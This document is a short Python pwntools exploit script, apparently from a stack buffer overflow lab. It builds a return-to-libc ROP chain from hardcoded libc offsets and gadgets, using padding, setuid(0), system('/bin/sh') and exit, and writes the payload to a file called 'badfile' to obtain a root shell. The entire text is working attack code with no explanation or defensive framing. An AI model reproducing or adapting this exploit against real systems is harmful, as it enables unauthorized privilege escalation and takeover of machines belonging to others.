#!/usr/bin/env python3

from pwn import *
def to_bytes(value):
    return value.to_bytes(8, byteorder='little')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
ret_offset = 0x2235f
pop_rdi_offset = 0x237b6 # found with ROPgadget
libc_start_main_offset = libc.symbols["__libc_start_main"]
system_offset = libc.symbols["system"]
exit_offset = libc.symbols["exit"]
bin_sh_str_offset = next(libc.search(b"/bin/sh"))
setuid_offset = libc.symbols["setuid"]
#p = process("./stack")
#p = remote("localhost", 31337)
address = 0x00007ffff7def000
libc_base = address
res_add = libc_base + 0x3905a
res_add_two = libc_base + 0x26760
ret = libc_base + ret_offset
system = libc_base + system_offset
exit = libc_base + exit_offset
pop_rdi = libc_base + pop_rdi_offset
bin_sh_str = libc_base + bin_sh_str_offset
setuid = libc_base + setuid_offset

print("system", hex(system))
print("exit", hex(exit))
print("poprdi", hex(pop_rdi))
print("bin_sh_str", hex(bin_sh_str))
print("setuid", hex(setuid))
print("ret", hex(ret))
print("res", hex(res_add))

payload = b'A'*120
payload += to_bytes(res_add)
payload += to_bytes(ret)
payload += to_bytes(ret)
payload += to_bytes(ret)
payload += to_bytes(ret)
payload += to_bytes(pop_rdi)
payload += to_bytes(0)      # Argument: setuid(0)
payload += to_bytes(setuid)
payload += to_bytes(pop_rdi)
payload += to_bytes(bin_sh_str)
payload += to_bytes(system)
payload += to_bytes(pop_rdi)
payload += to_bytes(0)
payload += to_bytes(exit)
print("beginning root shell attack")
# Save content to a file
with open("badfile", "wb") as f:
  f.write(payload)
